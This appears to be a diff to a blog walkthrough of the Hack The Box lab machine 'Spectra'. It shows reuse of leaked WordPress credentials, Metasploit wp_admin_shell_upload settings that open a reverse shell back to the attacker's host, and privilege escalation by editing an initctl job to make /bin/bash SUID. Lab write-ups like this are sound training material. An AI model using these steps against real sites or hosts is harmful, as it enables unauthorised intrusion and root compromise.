@@ -20,10 +20,10 @@ output: html_document
 ![desc]({{https://jsom1.github.io/}}/_images/htb_spectra_desc.png)
 </div>
 
-**Ports/services exploited:** \\
-**Tools:** wpscan, hydra\\
-**Techniques:** \\
-**Keywords:** \\
+**Ports/services exploited:** WordPress\\
+**Tools:** wpscan, hydra (not necessary), sqlmap (not necessary)\\
+**Techniques:** enumeration\\
+**Keywords:** wp_admin_shell_upload, SQL injection (not necessary)\\
 
 
 ## 1. Port scanning
@@ -138,20 +138,126 @@ sqlmap -u http://spectra.htb/main/?p=1#comments
 As we see in the ouput below, the tools tested many different injections:
 
 <div class="img_container">
-![SQmap]({{https://jsom1.github.io/}}/_images/htb_spectra_sqlmap.png){: height="415px" width = 625px"}
+![SQmap]({{https://jsom1.github.io/}}/_images/htb_spectra_sqlmap.png)
 </div>
 
 SQLmap didn't find anything either, so SQLi is probably not what we're looking for.
 
-From research on the net and in Metasploit, Nginx 1.17.4 seems to be vulnerable to RCE but I can't find more info about it.\\
-Versions of PHP prior to 5.6.40 were subject to many vulnerabilities, but this current version seems to be alright.\\
+There are two other links on the website: *Entries feed* and *Comments feed*. When we open the first one, we see the following:
 
+<div class="img_container">
+![Entries feed]({{https://jsom1.github.io/}}/_images/htb_spectra_entries.png){: height="415px" width = 625px"}
+</div>
 
+We see another host, *http://10.10.10.90/sites/dev/?p=1*. Is it the dev site of the application? Anyways, we cannot ping it (host unreachable) nor browse to it... After a while of pretty much trying everything, I came back at the other link (among the two first links we saw, *Software Issue Tracker* and *Test*) and clicked on it. As previously, we have the error "Error establishing a database connection". The URL at this point is *spectra.htb/testing/index.php*.\\
+It appears that by removing the */index.php* part of the URL, we see a list of php scripts:
 
+<div class="img_container">
+![Scripts]({{https://jsom1.github.io/}}/_images/htb_spectra_scripts.png){: height="415px" width = 625px"}
+</div>
 
+Most of those links return the error we just saw or some show a blank page. Some of them are accessible and contain a bunch of other php scripts within them. After looking those files I had to ask for help. It was a good thing because I would never have thought about that: even though a page appears blank in the browser, we can *curl* into its location to see its content:
 
+<div class="img_container">
+![Config]({{https://jsom1.github.io/}}/_images/htb_spectra_config.png)
+</div>
 
+We see a database username and password in cleartext (user 'devtest', password 'devteam01'). However, we can't access the MySQL instance for the moment as we don't have a foothold on the server yet... Let's try to use those credentials on the login page... It doesn't work, but it does for *administrator* / *devteam01*:
 
+<div class="img_container">
+![login]({{https://jsom1.github.io/}}/_images/htb_spectra_cms.png)
+</div>
 
+Now that we have a foothold, we would ideally like to have a shell. I think we could add a new theme or plugin in which we'd put a malicious payload (reverse shell), but that would screw the box for other players. So, since we saw the version of WordPress is out of date, we can try to use the famous wp_admin_shell_upload exploit. We start Metasploit, search for the exploit and use it:
+
+````
+sudo msfconsole -q
+search wp_admin_shell_upload
+use exploit/unix/webapp/wp_admin_shell_upload
+`````
+
+We look at the required options with *options* and set them as follows:
+
+````
+set PASSWORD devteam01
+set RHOSTS 10.10.10.229
+set USERNAME administrator
+set TARGETURI /main
+set LPORT 4444
+set LHOST 10.10.14.6
+`````
+
+Where LHOST is my tun0 IP (shown by *sudo ifconfig tun0*). Once this is done, we can enter the command *exploit*:
+
+<div class="img_container">
+![Shell]({{https://jsom1.github.io/}}/_images/htb_spectra_shell.png)
+</div>
+
+Finally we've got a shell! However we see we're "in as nginx", and we have to find a way to a user (where the flag is!). Let's start with manual enumeration. The basic shell we have is a nightmare, so let's upgrade it to a fully interactive shell:
+
+<div class="img_container">
+![Python shell]({{https://jsom1.github.io/}}/_images/htb_spectra_pty.png)
+</div>
+
+Note that prior executing this command, it might be necessary to *cd* a few directories back. We can now check for other usernames in */home*. There, we see *chronos*, *katie*, *nginx*, *root*, and *user*. We can *cd* into katie's home and we see the *user.txt* file, but we don't have the permission to read it. Let's keep on enumerating until we find something interesting.\\
+
+There is an interesting file in */opt* called *autologin.conf.orig*. Reading it informs us it's a script to automatically login at boot. Here's the content of the script:
+
+<div class="img_container">
+![autolog]({{https://jsom1.github.io/}}/_images/htb_spectra_autolog.png)
+</div>
+
+It mentions the directory */etc/autologin*, that should apparently contain a *passwd* file. Let's check if it is the case:
+
+<div class="img_container">
+![password]({{https://jsom1.github.io/}}/_images/htb_spectra_pw.png)
+</div>
+
+It is indeed, and we've got a password. I tried to change the current user with the command *su -l <username>* (trying with katie), but it doesn't work. We could try to use those credentials to SSH into the server:
+ 
+<div class="img_container">
+![user flag]({{https://jsom1.github.io/}}/_images/htb_spectra_user.png)
+</div>
+ 
+It worked and we can retrieve the user flag! Note that there's normally a message when we SSH for the first time, but I had to do a few attempts because I typed the password wrong... If this message appears, we simply say 'yes' to continue.\\
+Great! I also used the command *sudo -l* to view katie's permissions. I once learned the hard lesson to always make this check quickly as it might save us a lot of time!
+ 
+When we see this kind of information, the first thing to do is to check GTFOBins (https://gtfobins.github.io/), a list of binaries that can be exploited to escalate privileges. I found nothing there and then searched for "privilege escalation /sbin/initctl no passwd" on Google. It's "funny" because the first link that comes out is actually this exact example (the machine isn't retired yet and it is prohibited to publish walkthroughs). I guess the author thought it was ok because it is not a full walkthrough, but rather focuses on PE with initctl...\\
+Since I'm lost and don't know this PE vector yet, I decided to follow the article even though it would spoil the thing.
+ 
+But first, what's *initctl*? It's a control tool that allows a system admin to communicate and interact with the upstart init(8) daemon. Init is the parent of all processes on the system, it is executed by the kernel and is responsible fo starting all other processes. We can see the various files with:
+ 
+````
+ls /etc/init
+`````
+
+There are many *.conf* files, among which a few *test.conf*. Let's look at this script:
+
+<div class="img_container">
+![test.conf]({{https://jsom1.github.io/}}/_images/htb_spectra_init.png)
+</div>
+ 
+We see the author is katie, this is probably why she can execute *initctl* with high privileges without any password. If we can write our own code here, we might be able to escalate our privileges. We'll make it change permissions on */bin/bash* so that we can execute it with root permissions as katie. To do so, we edit the file with nano, save (ctrl+O) and exit (ctrl+x):
+ 
+<div class="img_container">
+![edit test.conf]({{https://jsom1.github.io/}}/_images/htb_spectra_edit.png)
+</div>
+ 
+There is an error message but as wee see in the image above, the content was indeed modified. We start the process and run bash as root
+ 
+<div class="img_container">
+![root]({{https://jsom1.github.io/}}/_images/htb_spectra_root.png)
+</div>
+ 
+And finally there it is, after many hours of struggling!\\
+We can find more information about the *-p* flag by using the command */bin/bash -c "help set*. Its description is: "Turned on whenever the real and effective user ids do not match. Disables processing of the $ENV file and importing of shell functions. Turning this option off causes the effective uid and gid to be set to the real uid and gid."\\
 
 <ins>**My thoughts**</ins>
+ 
+That was a great box! I pretty much lost myself in every possible rabbit hole before getting a foothold, but that was a good occasion to review some tools and techniques! Then I had to use the famous wp_shell_upload exploit that I learned about in the OSCP course. I think it's the first time I found this vulnerability on HtB.\\
+PE was kind of hard for me. I discovered the vector almost instantly as I now execute *sudo -l* as soon as I can, but I had no idea about how to take advantage of it. \\
+The box is rated easy, but I'd rather say it's medium. Boxes are often rated based on how manual they are, but I found the enumeration on this one to be hard. I wouldn't recommend this box to an absolute beginner, but it was well suited for my level!
+ 
+
+ 
+ 
